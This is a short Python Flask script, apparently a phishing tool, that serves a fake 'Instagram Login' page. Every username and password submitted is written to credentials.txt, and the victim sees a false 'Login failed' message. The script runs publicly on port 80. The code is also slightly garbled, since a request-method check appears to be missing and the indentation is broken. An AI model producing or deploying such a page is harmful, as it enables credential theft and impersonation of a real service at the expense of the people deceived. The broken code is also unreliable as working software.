python
import requests
from flask import Flask, request, render_template_string
app = Flask(__name__)
login_html = """
<!DOCTYPE html>
<html>
<head>
    <title>Instagram Login</title>
</head>
<body>
    <form method="POST">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Login</button>
    </form>
</body>
</html>
"""
@app.route('/', methods=['GET', 'POST'])
def login():
        username = request.form['username']
        password = request.form['password']
        with open("credentials.txt", "a") as f:
            f.write(f"Username: {username}, Password: {password}\n")
        return "Login failed. Please check your credentials and try again."
    return render_template_string(login_html)
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
